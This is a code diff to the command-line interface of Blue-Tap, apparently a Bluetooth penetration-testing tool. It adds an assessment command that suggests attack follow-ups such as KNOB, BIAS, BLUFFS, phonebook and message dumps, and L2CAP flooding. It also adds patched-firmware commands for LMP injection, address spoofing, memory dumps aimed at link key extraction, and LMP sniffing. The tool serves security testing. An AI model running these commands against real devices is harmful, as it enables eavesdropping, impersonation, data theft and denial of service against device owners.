@@ -21,9 +21,9 @@ click.rich_click.STYLE_COMMAND = "bold"
 # Command grouping — pentest flow order
 click.rich_click.COMMAND_GROUPS = {
     "python -m blue_tap.cli": [
+        {"name": "Assessment", "commands": ["assess", "vulnscan", "fleet"]},
         {"name": "Discovery & Reconnaissance", "commands": ["scan", "recon", "adapter"]},
-        {"name": "Assessment", "commands": ["vulnscan", "fleet"]},
-        {"name": "Exploitation", "commands": ["hijack", "bias", "knob", "ssp-downgrade", "spoof"]},
+        {"name": "Exploitation", "commands": ["hijack", "bias", "knob", "bluffs", "encryption-downgrade", "ssp-downgrade", "spoof"]},
         {"name": "Data Extraction & Audio", "commands": ["pbap", "map", "at", "opp", "hfp", "audio", "avrcp"]},
         {"name": "Fuzzing & Stress Testing", "commands": ["fuzz", "dos"]},
         {"name": "Reporting & Automation", "commands": ["session", "report", "auto", "run"]},
@@ -36,9 +36,6 @@ from blue_tap.utils.output import (
     console, summary_panel,
 )
 from blue_tap.utils.interactive import resolve_address, pick_two_devices
-
-
-_SESSION_SKIP_COMMANDS = {"blue-tap", "blue-tap run"}
 
 
 def _normalize_command_path(ctx: click.Context) -> str:
@@ -95,8 +92,11 @@ def _infer_category(command_path: str) -> str:
         return "fuzz"
     if root == "dos":
         return "dos"
-    if root in {"hijack", "auto", "bias", "avrcp", "spoof"}:
+    if root in {"hijack", "auto", "bias", "avrcp", "spoof",
+                "bluffs", "knob", "encryption-downgrade", "ssp-downgrade"}:
         return "attack"
+    if root == "fleet":
+        return "vuln"
     return "general"
 
 
@@ -104,6 +104,11 @@ class LoggedCommand(click.RichCommand):
     """Click command with automatic session logging for every invocation."""
 
     def invoke(self, ctx):
+        # Record which adapter is being used (first --hci wins)
+        hci = ctx.params.get("hci")
+        if hci:
+            from blue_tap.utils.session import set_adapter
+            set_adapter(hci)
         # Commands log their own structured results via log_command().
         # No auto-logging here to avoid double-counting in sessions.
         return super().invoke(ctx)
@@ -166,6 +171,311 @@ def main(verbose, session_name):
     session = Session(session_name)
     set_session(session)
     info(f"Session: [bold]{session_name}[/bold] -> {session.dir}")
+
+    # Runtime DarkFirmware detection — check once per session
+    try:
+        from blue_tap.core.firmware import DarkFirmwareManager
+        fw = DarkFirmwareManager()
+        for hci_dev in ("hci1", "hci0"):
+            if fw.detect_rtl8761b(hci_dev):
+                if fw.is_darkfirmware_loaded(hci_dev):
+                    info(f"[green]DarkFirmware active on {hci_dev}[/green] — LMP injection/monitoring enabled")
+                else:
+                    warning(f"RTL8761B detected on {hci_dev} but DarkFirmware not loaded. "
+                            f"Run: [bold]sudo blue-tap adapter firmware-install --hci {hci_dev}[/bold]")
+                break
+    except Exception:
+        pass  # Don't let firmware detection break CLI startup
+
+
+# ============================================================================
+# ASSESS - Safe Non-Destructive Security Assessment
+# ============================================================================
+@main.command("assess")
+@click.argument("target")
+@click.option("-i", "--hci", default="hci0", help="HCI adapter")
+@click.option("-o", "--output", default=None, help="Save assessment to JSON file")
+@click.option("--active", is_flag=True, help="Enable active LMP probing (requires DarkFirmware)")
+def assess_target(target, hci, output, active):
+    """Safe, non-destructive security assessment of a Bluetooth target.
+
+    \b
+    Runs fingerprinting, service enumeration, and vulnerability scanning
+    WITHOUT exploitation. Shows a clear summary with recommended next steps.
+
+    \b
+    Phases:
+      1. Fingerprint — BT version, chipset, LMP features
+      2. Service discovery — SDP browse, RFCOMM/L2CAP scan
+      3. Vulnerability scan — 20+ CVE checks
+      4. DarkFirmware probe — active LMP feature/version check (if --active)
+      5. Summary — findings table + recommended attack commands
+
+    \b
+    Examples:
+      blue-tap assess AA:BB:CC:DD:EE:FF
+      blue-tap assess AA:BB:CC:DD:EE:FF --active -i hci1
+      blue-tap assess AA:BB:CC:DD:EE:FF -o assessment.json
+    """
+    import time as _time
+
+    from blue_tap.utils.bt_helpers import normalize_mac
+    from blue_tap.utils.session import log_command
+
+    target = normalize_mac(target)
+    results: dict = {"target": target, "hci": hci, "phases": {}}
+    total_start = _time.time()
+
+    # ── Phase 1: Fingerprint ──────────────────────────────────────────
+    info(f"[Assess] Phase 1/5: Fingerprinting [bold]{target}[/bold]...")
+    phase_start = _time.time()
+    fp = {}
+    try:
+        from blue_tap.recon.fingerprint import fingerprint_device
+        fp = fingerprint_device(target, hci)
+        elapsed = _time.time() - phase_start
+        results["phases"]["fingerprint"] = {**fp, "_elapsed_seconds": round(elapsed, 1)}
+        bt_ver = fp.get("bt_version") or "unknown"
+        manufacturer = fp.get("manufacturer") or "unknown"
+        lmp_ver = fp.get("lmp_version") or "unknown"
+        name = fp.get("name") or "unknown"
+        info(f"[Assess] Phase 1 complete ({elapsed:.1f}s) - "
+             f"{name}, BT {bt_ver}, {manufacturer}, LMP {lmp_ver}")
+    except Exception as exc:
+        elapsed = _time.time() - phase_start
+        warning(f"[Assess] Phase 1 failed ({elapsed:.1f}s): {exc}")
+        results["phases"]["fingerprint"] = {"status": "failed", "error": str(exc),
+                                            "_elapsed_seconds": round(elapsed, 1)}
+
+    # ── Phase 2: Service Discovery ────────────────────────────────────
+    info(f"[Assess] Phase 2/5: Discovering services on [bold]{target}[/bold]...")
+    phase_start = _time.time()
+    services: list[dict] = []
+    rfcomm_channels: list[dict] = []
+    try:
+        from blue_tap.recon.sdp import browse_services
+        services = browse_services(target, hci=hci)
+
+        from blue_tap.recon.rfcomm_scan import RFCOMMScanner
+        scanner = RFCOMMScanner(target)
+        rfcomm_channels = scanner.scan_all_channels(hci=hci)
+
+        open_channels = [ch for ch in rfcomm_channels if ch.get("status") == "open"]
+        elapsed = _time.time() - phase_start
+        results["phases"]["services"] = {
+            "sdp_services": services,
+            "rfcomm_channels": rfcomm_channels,
+            "_elapsed_seconds": round(elapsed, 1),
+        }
+        info(f"[Assess] Phase 2 complete ({elapsed:.1f}s) - "
+             f"{len(services)} SDP services, {len(open_channels)} open RFCOMM channels")
+
+        # Display services table
+        if services:
+            svc_table = Table(title="[bold cyan]Discovered Services[/bold cyan]",
+                              show_lines=False, border_style="dim")
+            svc_table.add_column("#", style="dim", width=4, justify="right")
+            svc_table.add_column("Service", style="bold white")
+            svc_table.add_column("Channel/PSM", style="cyan")
+            svc_table.add_column("Protocol", style="dim")
+            for idx, svc in enumerate(services, 1):
+                svc_name = svc.get("name", svc.get("service", "Unknown"))
+                channel = str(svc.get("channel", svc.get("psm", "")))
+                protocol = svc.get("protocol", "")
+                svc_table.add_row(str(idx), svc_name, channel, protocol)
+            console.print(svc_table)
+    except Exception as exc:
+        elapsed = _time.time() - phase_start
+        warning(f"[Assess] Phase 2 failed ({elapsed:.1f}s): {exc}")
+        results["phases"]["services"] = {"status": "failed", "error": str(exc),
+                                         "_elapsed_seconds": round(elapsed, 1)}
+
+    # ── Phase 3: Vulnerability Scan ───────────────────────────────────
+    info(f"[Assess] Phase 3/5: Scanning for vulnerabilities on [bold]{target}[/bold]...")
+    phase_start = _time.time()
+    findings: list[dict] = []
+    try:
+        from blue_tap.attack.vuln_scanner import scan_vulnerabilities
+        findings = scan_vulnerabilities(target, hci=hci, active=active)
+        elapsed = _time.time() - phase_start
+        results["phases"]["vulnscan"] = {
+            "findings": findings,
+            "_elapsed_seconds": round(elapsed, 1),
+        }
+
+        sev_counts: dict[str, int] = {}
+        for f in findings:
+            sev = f.get("severity", "info").upper()
+            sev_counts[sev] = sev_counts.get(sev, 0) + 1
+        sev_summary = ", ".join(f"{c} {s}" for s, c in sorted(sev_counts.items()))
+        info(f"[Assess] Phase 3 complete ({elapsed:.1f}s) - "
+             f"{len(findings)} findings ({sev_summary})")
+
+        # Display findings table using the standard vuln_table helper
+        if findings:
+            from blue_tap.utils.output import vuln_table
+            console.print(vuln_table(findings, title="Assessment Findings"))
+    except Exception as exc:
+        elapsed = _time.time() - phase_start
+        warning(f"[Assess] Phase 3 failed ({elapsed:.1f}s): {exc}")
+        results["phases"]["vulnscan"] = {"status": "failed", "error": str(exc),
+                                         "_elapsed_seconds": round(elapsed, 1)}
+
+    # ── Phase 4: DarkFirmware Active LMP Probing (optional) ──────────
+    lmp_features_result = None
+    lmp_version_result = None
+    if active:
+        info(f"[Assess] Phase 4/5: Active LMP probing via DarkFirmware on [bold]{target}[/bold]...")
+        phase_start = _time.time()
+        try:
+            from blue_tap.attack.vuln_scanner import _probe_lmp_features, _probe_lmp_version
+            lmp_features_result = _probe_lmp_features(target, hci)
+            lmp_version_result = _probe_lmp_version(target, hci)
+            elapsed = _time.time() - phase_start
+            results["phases"]["darkfirmware_probe"] = {
+                "lmp_features": lmp_features_result,
+                "lmp_version": lmp_version_result,
+                "_elapsed_seconds": round(elapsed, 1),
+            }
+
+            if lmp_features_result or lmp_version_result:
+                probe_table = Table(title="[bold cyan]DarkFirmware LMP Probe Results[/bold cyan]",
+                                    show_lines=False, border_style="dim")
+                probe_table.add_column("Property", style="bold white")
+                probe_table.add_column("Value", style="cyan")
+                if lmp_version_result:
+                    probe_table.add_row("LMP Version",
+                                        str(lmp_version_result.get("lmp_version", "N/A")))
+                    probe_table.add_row("Company ID",
+                                        str(lmp_version_result.get("company_id", "N/A")))
+                    probe_table.add_row("Sub-version",
+                                        str(lmp_version_result.get("sub_version", "N/A")))
+                if lmp_features_result:
+                    features = lmp_features_result.get("features", {})
+                    probe_table.add_row("Feature Bitmap",
+                                        lmp_features_result.get("raw_bitmap", "N/A"))
+                    probe_table.add_row("Encryption Support",
+                                        str(features.get("encryption", "N/A")))
+                    probe_table.add_row("Secure Connections",
+                                        str(features.get("secure_connections", "N/A")))
+                console.print(probe_table)
+
+            info(f"[Assess] Phase 4 complete ({elapsed:.1f}s)")
+        except Exception as exc:
+            elapsed = _time.time() - phase_start
+            warning(f"[Assess] Phase 4 failed ({elapsed:.1f}s): {exc}")
+            results["phases"]["darkfirmware_probe"] = {
+                "status": "failed", "error": str(exc),
+                "_elapsed_seconds": round(elapsed, 1),
+            }
+    else:
+        info("[Assess] Phase 4/5: Skipped (use --active for DarkFirmware LMP probing)")
+
+    # ── Phase 5: Summary & Recommendations ────────────────────────────
+    info(f"[Assess] Phase 5/5: Generating assessment summary...")
+    total_elapsed = _time.time() - total_start
+
+    # Build severity counts
+    sev_counts_final: dict[str, int] = {}
+    for f in findings:
+        sev = f.get("severity", "info").upper()
+        sev_counts_final[sev] = sev_counts_final.get(sev, 0) + 1
+
+    bt_ver_display = fp.get("bt_version", "unknown") if fp else "unknown"
+    manufacturer_display = fp.get("manufacturer", "unknown") if fp else "unknown"
+    sev_line_parts = []
+    for sev_name in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
+        count = sev_counts_final.get(sev_name, 0)
+        if count > 0:
+            sev_line_parts.append(f"{count} {sev_name}")
+    sev_line = ", ".join(sev_line_parts) if sev_line_parts else "none"
+
+    # Security-relevant services
+    security_profiles = {"PBAP", "MAP", "OPP", "SPP", "DUN", "HFP", "HFP AG"}
+    sec_relevant = [s for s in services
+                    if any(p in s.get("name", s.get("service", ""))
+                           for p in security_profiles)]
+
+    summary_items = {
+        "Target": target,
+        "BT Version": str(bt_ver_display),
+        "Manufacturer": str(manufacturer_display),
+        "Services": f"{len(services)} found ({len(sec_relevant)} security-relevant)",
+        "Findings": sev_line,
+        "Total Time": f"{total_elapsed:.1f}s",
+    }
+    summary_panel("Assessment Summary", summary_items, style="cyan")
+
+    # Recommended next steps — actionable commands for high/medium findings
+    high_medium = [f for f in findings
+                   if f.get("severity", "").lower() in ("critical", "high", "medium")]
+    if high_medium:
+        console.print()
+        console.print("[bold cyan]Recommended next steps:[/bold cyan]")
+        _sev_styles = {
+            "critical": "bold red",
+            "high": "red",
+            "medium": "yellow",
+        }
+        for finding in high_medium:
+            sev = finding.get("severity", "").lower()
+            name = finding.get("name", "Unknown")
+            style = _sev_styles.get(sev, "dim")
+            sev_label = sev.upper()
+
+            # Map finding names to recommended commands
+            cmd_suggestion = _suggest_command(name, target, hci)
+            console.print(f"  [{style}]{sev_label:<8}[/{style}] {name}")
+            if cmd_suggestion:
+                console.print(f"           [dim]-> {cmd_suggestion}[/dim]")
+    elif findings:
+        info("[Assess] No critical/high/medium findings - target looks reasonably hardened")
+    else:
+        info("[Assess] No vulnerability findings generated")
+
+    info(f"[Assess] Assessment complete in {total_elapsed:.1f}s")
+
+    # Save results
+    results["summary"] = summary_items
+    results["_total_elapsed_seconds"] = round(total_elapsed, 1)
+    log_command("assess", results, category="vuln", target=target)
+
+    if output:
+        _save_json(results, output)
+
+
+def _suggest_command(finding_name: str, target: str, hci: str) -> str:
+    """Map a vulnerability finding name to a recommended blue-tap command."""
+    name_lower = finding_name.lower()
+    if "knob" in name_lower:
+        return f"blue-tap knob probe {target} -i {hci}"
+    if "bluffs" in name_lower:
+        return f"blue-tap bluffs {target} --variant probe -i {hci}"
+    if "bias" in name_lower:
+        return f"blue-tap bias {target} -i {hci}"
+    if "ssp" in name_lower or "pairing" in name_lower:
+        return f"blue-tap ssp-downgrade {target} -i {hci}"
+    if "encryption" in name_lower:
+        return f"blue-tap encryption-downgrade {target} -i {hci}"
+    if "pbap" in name_lower or "phonebook" in name_lower:
+        return f"blue-tap pbap dump {target} -i {hci}"
+    if "map" in name_lower or "message" in name_lower:
+        return f"blue-tap map dump {target} -i {hci}"
+    if "opp" in name_lower or "object push" in name_lower:
+        return f"blue-tap opp {target} -i {hci}"
+    if "rfcomm" in name_lower or "serial" in name_lower:
+        return f"blue-tap recon rfcomm-scan {target}"
+    if "sdp" in name_lower:
+        return f"blue-tap recon sdp {target}"
+    if "hfp" in name_lower or "hands-free" in name_lower:
+        return f"blue-tap hfp {target} -i {hci}"
+    if "spoof" in name_lower:
+        return f"blue-tap spoof {target} -i {hci}"
+    if "dos" in name_lower or "denial" in name_lower:
+        return f"blue-tap dos l2cap-flood {target} -i {hci}"
+    if "fuzz" in name_lower:
+        return f"blue-tap fuzz lmp {target} -i {hci}"
+    return ""
 
 
 # ============================================================================
@@ -278,6 +588,291 @@ def set_class(hci, device_class):
     """Set device class. Default 0x5a020c = smartphone."""
     from blue_tap.core.adapter import set_device_class
     set_device_class(hci, device_class)
+
+
+@adapter.command("firmware-status")
+@click.option("--hci", default="hci1", help="HCI device to check")
+def adapter_firmware_status(hci):
+    """Check DarkFirmware status on RTL8761B adapter."""
+    from blue_tap.core.firmware import DarkFirmwareManager
+
+    fw = DarkFirmwareManager()
+    status = fw.get_firmware_status(hci)
+
+    # Display with Rich formatting
+    info(f"RTL8761B detected: {status.get('installed', False)}")
+    info(f"DarkFirmware loaded: {status.get('loaded', False)}")
+    info(f"Current BDADDR: {status.get('bdaddr', 'unknown')}")
+    info(f"Original firmware backed up: {status.get('original_backed_up', False)}")
+    if status.get("capabilities"):
+        info(f"Capabilities: {', '.join(status['capabilities'])}")
+
+
+@adapter.command("firmware-install")
+@click.option("--source", default=None, type=click.Path(exists=True),
+              help="Path to custom firmware binary (default: bundled DarkFirmware)")
+@click.option("--restore", is_flag=True, help="Restore original Realtek firmware")
+@click.option("--hci", default="hci1", help="HCI device")
+def adapter_firmware_install(source, restore, hci):
+    """Install DarkFirmware on RTL8761B adapter.
+
+    \b
+    Copies the pre-patched DarkFirmware (bundled with Blue-Tap) to
+    /lib/firmware/rtl_bt/ and USB-resets the adapter.  The original
+    firmware is backed up automatically.  Requires root.
+
+    \b
+    Features enabled by DarkFirmware:
+      - LMP packet injection (VSC 0xFE22)
+      - LMP traffic monitoring (HCI Event 0xFF)
+      - Controller memory read/write (VSC 0xFC61/0xFC62)
+      - Full 17-byte LMP PDU support (BLUFFS, BIAS, BrakTooth)
+      - BDADDR spoofing via firmware patching
+
+    \b
+    Examples:
+      sudo blue-tap adapter firmware-install           # install bundled DarkFirmware
+      sudo blue-tap adapter firmware-install --restore  # revert to stock Realtek
+    """
+    from blue_tap.core.firmware import DarkFirmwareManager
+
+    fw = DarkFirmwareManager()
+
+    if restore:
+        if fw.restore_firmware():
+            info("Resetting adapter to load original firmware...")
+            fw.usb_reset()
+            import time
+            time.sleep(2.5)
+            success("Original Realtek firmware restored")
+        else:
+            error("Failed to restore firmware")
+        return
+
+    if not fw.detect_rtl8761b(hci):
+        error(f"No RTL8761B adapter detected on {hci}. "
+              f"This command only works with TP-Link UB500 or compatible RTL8761B dongles.")
+        return
+
+    if fw.install_firmware(source):
+        info("Resetting adapter to load DarkFirmware...")
+        fw.usb_reset()
+        import time
+        time.sleep(2.5)
+
+        if fw.is_darkfirmware_loaded(hci):
+            success("DarkFirmware installed and verified!")
+        else:
+            warning("Firmware installed but DarkFirmware not detected — "
+                    "adapter may need manual replug")
+    else:
+        error("Firmware installation failed")
+
+
+@adapter.command("firmware-spoof")
+@click.argument("address")
+@click.option("--hci", default="hci1", help="HCI device")
+def adapter_firmware_spoof(address, hci):
+    """Spoof BDADDR via DarkFirmware firmware patching.
+
+    Patches the firmware binary and USB-resets the adapter.
+    This is the only reliable spoofing method for Realtek chipsets.
+    """
+    from blue_tap.core.firmware import DarkFirmwareManager
+
+    fw = DarkFirmwareManager()
+    if not fw.detect_rtl8761b(hci):
+        error(f"No RTL8761B detected on {hci}")
+        return
+
+    info(f"Patching BDADDR to {address}...")
+    if fw.patch_bdaddr(address, hci):
+        success(f"BDADDR set to {address}")
+    else:
+        error("BDADDR patching failed")
+
+
+@adapter.command("firmware-set")
+@click.argument("setting", type=click.Choice(["lmp-size", "lmp-slot"]))
+@click.argument("value", type=int)
+@click.option("--hci", default="hci1", help="HCI device")
+def adapter_firmware_set(setting, value, hci):
+    """Configure DarkFirmware parameters (persistent).
+
+    Changes are written to the firmware file on disk AND applied to live
+    RAM.  Survives USB resets, replugs, and reboots.
+
+    \b
+    Settings:
+      lmp-size   Max LMP packet size in bytes (default 10, spec max 17)
+      lmp-slot   ACL connection slot for LMP injection (0-11, default 0)
+
+    \b
+    Examples:
+      blue-tap adapter firmware-set lmp-size 17     # unlock full LMP PDUs
+      blue-tap adapter firmware-set lmp-size 10     # revert to default
+      blue-tap adapter firmware-set lmp-slot 0      # target first connection
+      blue-tap adapter firmware-set lmp-slot 2      # target third connection
+    """
+    from blue_tap.core.firmware import DarkFirmwareManager
+
+    fw = DarkFirmwareManager()
+    if not fw.is_darkfirmware_loaded(hci):
+        error(f"DarkFirmware not loaded on {hci}")
+        return
+
+    if setting == "lmp-size":
+        if fw.patch_send_length(value, hci):
+            success(f"LMP send size set to {value} bytes")
+        else:
+            error(f"Failed to set LMP send size to {value}")
+    elif setting == "lmp-slot":
+        if fw.patch_connection_index(value, hci):
+            success(f"LMP injection slot set to {value}")
+        else:
+            error(f"Failed to set LMP slot to {value}")
+
+
+@adapter.command("firmware-dump")
+@click.option("--start", type=str, default=None, help="Start address (hex, e.g., 0x80000000)")
+@click.option("--end", type=str, default=None, help="End address (hex)")
+@click.option("--region", type=click.Choice(["rom", "ram", "patch", "hooks"]), default=None,
+              help="Preset memory region")
+@click.option("-o", "--output", required=True, help="Output file path")
+@click.option("--hci", default="hci1", help="HCI device")
+def adapter_firmware_dump(start, end, region, output, hci):
+    """Dump RTL8761B controller memory to file.
+
+    \b
+    Read firmware ROM/RAM via DarkFirmware memory read VSC.
+    Use for offline reverse engineering, heap analysis, or
+    link key extraction.
+
+    \b
+    Preset regions:
+      rom    0x80000000 - 0x80100000  (1MB firmware ROM)
+      ram    0x80100000 - 0x80134000  (~200KB working RAM)
+      patch  0x80110000 - 0x80120000  (64KB DarkFirmware patch area)
+      hooks  0x80133F00 - 0x80134000  (256B hook backup area)
+
+    \b
+    Examples:
+      blue-tap adapter firmware-dump --region rom -o rom.bin
+      blue-tap adapter firmware-dump --region ram -o ram.bin
+      blue-tap adapter firmware-dump --start 0x8012DC50 --end 0x8012F450 -o connections.bin
+    """
+    from blue_tap.core.firmware import DarkFirmwareManager, MEMORY_REGIONS
+
+    fw = DarkFirmwareManager()
+    if not fw.is_darkfirmware_loaded(hci):
+        error(f"DarkFirmware not loaded on {hci}")
+        return
+
+    if region:
+        start_addr, end_addr = MEMORY_REGIONS[region]
+        info(f"Using preset region '{region}': 0x{start_addr:08X} - 0x{end_addr:08X}")
+    elif start and end:
+        try:
+            start_addr = int(start, 16) if isinstance(start, str) else start
+            end_addr = int(end, 16) if isinstance(end, str) else end
+        except ValueError:
+            error("Start and end addresses must be valid hex (e.g., 0x80000000)")
+            return
+    else:
+        error("Provide either --region or both --start and --end")
+        return
+
+    if fw.dump_memory(start_addr, end_addr, output, hci):
+        success(f"Dump saved to {output}")
+    else:
+        error("Memory dump failed")
+
+
+@adapter.command("connections")
+@click.option("--dump", is_flag=True, help="Full hex dump of all 12 slots")
+@click.option("--slot", type=int, default=None, help="Dump specific slot (0-11)")
+@click.option("-o", "--output", default=None, help="Save raw dump to file")
+@click.option("--hci", default="hci1", help="HCI device")
+def adapter_connections(dump, slot, output, hci):
+    """Inspect firmware connection table (12 slots).
+
+    \b
+    Reads the RTL8761B controller's internal connection array directly
+    from firmware RAM. Shows which slots are active and their metadata.
+
+    \b
+    Use --dump for raw hex analysis. Compare dumps before/after connecting
+    a device to reverse-engineer the struct layout.
+
+    \b
+    Examples:
+      blue-tap adapter connections                     # list active slots
+      blue-tap adapter connections --dump              # hex dump all 12 slots
+      blue-tap adapter connections --slot 0 -o slot0.bin  # save slot 0 to file
+    """
+    from blue_tap.core.firmware import DarkFirmwareManager
+
+    fw = DarkFirmwareManager()
+    if not fw.is_darkfirmware_loaded(hci):
+        error(f"DarkFirmware not loaded on {hci}")
+        return
+
+    # Single slot raw dump
+    if slot is not None:
+        if not 0 <= slot <= 11:
+            error("Slot must be 0-11")
+            return
+        info(f"Dumping raw connection slot {slot}...")
+        raw = fw.dump_connection_raw(slot, hci)
+        if not raw:
+            error(f"Failed to read slot {slot}")
+            return
+        # Display hex dump
+        for i in range(0, len(raw), 16):
+            hex_part = " ".join(f"{b:02X}" for b in raw[i:i+16])
+            ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in raw[i:i+16])
+            info(f"  {i:04X}: {hex_part:<48s}  {ascii_part}")
+        if output:
+            with open(output, "wb") as f:
+                f.write(raw)
+            success(f"Slot {slot} raw dump saved to {output} ({len(raw)} bytes)")
+        return
+
+    # Read all connection slots
+    info("Reading connection table from firmware RAM...")
+    connections = fw.dump_connections(hci)
+    if not connections:
+        warning("No connection data retrieved")
+        return
+
+    # Display table
+    table = Table(title="[bold #00d4ff]Connection Slots[/bold #00d4ff]", show_lines=True)
+    table.add_column("Slot", style="#00d4ff", justify="center")
+    table.add_column("Status", justify="center")
+    table.add_column("BD_ADDR", style="#bf5af2")
+    table.add_column("Address", style="dim")
+    if dump:
+        table.add_column("First 32 bytes (hex)", style="dim")
+
+    for conn in connections:
+        status = "[green]ACTIVE[/green]" if conn["active"] else "[dim]inactive[/dim]"
+        row = [str(conn["slot"]), status, conn["bd_addr"] or "-", conn["address"]]
+        if dump:
+            raw_hex = conn["raw_hex"][:64]  # first 32 bytes as hex
+            formatted = " ".join(raw_hex[i:i+2] for i in range(0, len(raw_hex), 2))
+            row.append(formatted)
+        table.add_row(*row)
+
+    console.print(table)
+
+    active = sum(1 for c in connections if c["active"])
+    info(f"Summary: {active} active / {len(connections)} total connection slots")
+
+    if output:
+        import json as _json
+        with open(output, "w") as f:
+            _json.dump(connections, f, indent=2)
+        success(f"Connection data saved to {output}")
 
 
 # ============================================================================
@@ -635,15 +1230,78 @@ def recon_nrf_scan(duration):
     sniffer.scan_advertisers(duration)
 
 
-@recon.command("usrp-scan")
-@click.option("-d", "--duration", default=30, help="Scan duration (seconds)")
-def recon_usrp_scan(duration):
-    """Scan for BR/EDR piconets using USRP B210."""
-    from blue_tap.recon.sniffer import USRPCapture
+@recon.command("lmp-sniff")
+@click.argument("address", required=False, default=None)
+@click.option("-d", "--duration", default=120, type=int, help="Capture duration in seconds")
+@click.option("-o", "--output", default="lmp_capture.json", help="Output file path")
+@click.option("--hci", default="hci1", help="HCI device for DarkFirmware adapter (e.g. hci1 or 1)")
+@click.option("-f", "--format", "output_format", default="json",
+              type=click.Choice(["json", "pcap"]), help="Output format (json=BTIDES v2, pcap=Wireshark)")
+@click.option("--filter", "lmp_filter", default=None,
+              type=click.Choice(["auth", "encryption", "features", "security"]),
+              help="Filter LMP packets by category")
+def recon_lmp_sniff(address, duration, output, hci, output_format, lmp_filter):
+    """Capture LMP traffic using DarkFirmware RTL8761B.
 
-    info(f"Starting BR/EDR piconet scan via USRP B210 ({duration}s)...")
-    cap = USRPCapture()
-    cap.scan_piconets(duration)
+    Monitors incoming LMP packets via the firmware's RX hook.
+    Captures pre-encryption negotiation (features, auth, key size).
+    Exports to BTIDES v2 JSON or Wireshark pcap format.
+    """
+    from blue_tap.recon.sniffer import DarkFirmwareSniffer, LMPFilter
+
+    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
+    sniffer = DarkFirmwareSniffer(hci_dev=hci_dev)
+    if not sniffer.is_available():
+        error("DarkFirmware not available. Check adapter with: blue-tap adapter firmware-status")
+        return
+
+    pkt_filter = LMPFilter(category=lmp_filter) if lmp_filter else None
+    info(f"Starting LMP capture (duration={duration}s, output={output}, format={output_format})")
+    result = sniffer.start_capture(
+        target=address,
+        output=output,
+        duration=duration,
+        lmp_filter=pkt_filter,
+        output_format=output_format,
+    )
+
+    if result["success"]:
+        success(f"Captured {result['packets']} LMP packets in {result['duration']}s")
+        success(f"Output: {result['output']}")
+    else:
+        error("LMP capture failed")
+
+
+@recon.command("lmp-monitor")
+@click.argument("address", required=False, default=None)
+@click.option("-d", "--duration", default=0, type=int, help="Monitor duration (0=until Ctrl-C)")
+@click.option("--hci", default="hci1", help="HCI device for DarkFirmware adapter (e.g. hci1 or 1)")
+@click.option("--dashboard", is_flag=True, help="Rich live dashboard display")
+@click.option("--filter", "lmp_filter", default=None,
+              type=click.Choice(["auth", "encryption", "features", "security"]),
+              help="Filter LMP packets by category")
+def recon_lmp_monitor(address, duration, hci, dashboard, lmp_filter):
+    """Real-time LMP packet monitor using DarkFirmware.
+
+    Shows incoming LMP packets in real-time on the console.
+    Use --dashboard for a Rich live UI with packet stream table.
+    Use Ctrl-C to stop monitoring.
+    """
+    from blue_tap.recon.sniffer import DarkFirmwareSniffer, LMPFilter
+
+    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
+    sniffer = DarkFirmwareSniffer(hci_dev=hci_dev)
+    if not sniffer.is_available():
+        error("DarkFirmware not available. Check adapter with: blue-tap adapter firmware-status")
+        return
+
+    pkt_filter = LMPFilter(category=lmp_filter) if lmp_filter else None
+    sniffer.monitor(
+        target=address,
+        duration=duration,
+        lmp_filter=pkt_filter,
+        dashboard=dashboard,
+    )
 
 
 @recon.command("nrf-sniff")
@@ -660,34 +1318,49 @@ def recon_nrf_sniff(target, output, duration):
     sniffer.sniff_pairing(output, duration, target=target)
 
 
-@recon.command("usrp-follow")
+@recon.command("combined-sniff")
 @click.argument("address", required=False, default=None)
-@click.option("-o", "--output", default="bt_capture.pcap", help="Output pcap file")
-@click.option("-d", "--duration", default=120, help="Capture duration (seconds)")
-def recon_usrp_follow(address, output, duration):
-    """Follow a BR/EDR piconet and capture traffic using USRP B210."""
-    address = resolve_address(address)
-    if not address:
+@click.option("-d", "--duration", default=60, type=int, help="Capture duration in seconds")
+@click.option("-o", "--output", default="combined_capture.json", help="Output file path")
+@click.option("--hci", default="hci1", help="HCI device for DarkFirmware adapter (e.g. hci1 or 1)")
+def recon_combined_sniff(address, duration, output, hci):
+    """Simultaneous BLE + LMP monitoring.
+
+    Runs nRF52840 BLE sniffer and DarkFirmware LMP monitor concurrently
+    with a unified timeline. Covers the full attack surface from
+    advertisements through link-layer negotiation.
+    """
+    from blue_tap.recon.sniffer import (
+        CombinedSniffer, NRFBLESniffer, DarkFirmwareSniffer,
+    )
+
+    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
+    nrf_ok = NRFBLESniffer.is_available()
+    df_ok = DarkFirmwareSniffer(hci_dev=hci_dev).is_available()
+
+    if not nrf_ok and not df_ok:
+        error("Neither nRF52840 nor DarkFirmware adapter available")
         return
-    from blue_tap.recon.sniffer import USRPCapture
 
-    info(f"Following piconet [bold]{address}[/bold] via USRP B210 ({duration}s)...")
-    cap = USRPCapture()
-    cap.follow_piconet(address, output, duration)
+    if not nrf_ok:
+        warning("nRF52840 not available, LMP-only capture")
+    if not df_ok:
+        warning("DarkFirmware not available, BLE-only capture")
 
+    info(f"Starting combined BLE+LMP capture (duration={duration}s)")
+    combined = CombinedSniffer(
+        nrf_available=nrf_ok,
+        darkfirmware_available=df_ok,
+        hci_dev=hci_dev,
+    )
+    result = combined.monitor(target=address, duration=duration)
 
-@recon.command("usrp-capture")
-@click.option("-o", "--output", default="raw_capture.iq", help="Output IQ file")
-@click.option("-d", "--duration", default=60, help="Capture duration (seconds)")
-@click.option("--freq", default=2441000000, help="Center frequency (Hz)")
-@click.option("--rate", default=4000000, help="Sample rate (Hz)")
-def recon_usrp_capture(output, duration, freq, rate):
-    """Raw IQ capture with USRP B210."""
-    from blue_tap.recon.sniffer import USRPCapture
-
-    info(f"Starting raw IQ capture via USRP B210 ({duration}s, {freq/1e6:.0f}MHz)...")
-    cap = USRPCapture()
-    cap.capture_raw_iq(output, duration, freq, rate)
+    if result.get("success"):
+        combined.export(output)
+        success(f"Combined capture: {result['lmp_count']} LMP + {result['ble_count']} BLE events")
+        success(f"Output: {output}")
+    else:
+        error("Combined capture failed")
 
 
 @recon.command("crack-key")
@@ -732,7 +1405,7 @@ def recon_inject_link_key(remote_mac, link_key, hci, key_type):
     """Inject a recovered link key into BlueZ for impersonation.
 
     \b
-    After recovering a link key (via nRF/USRP capture + crack, or other means),
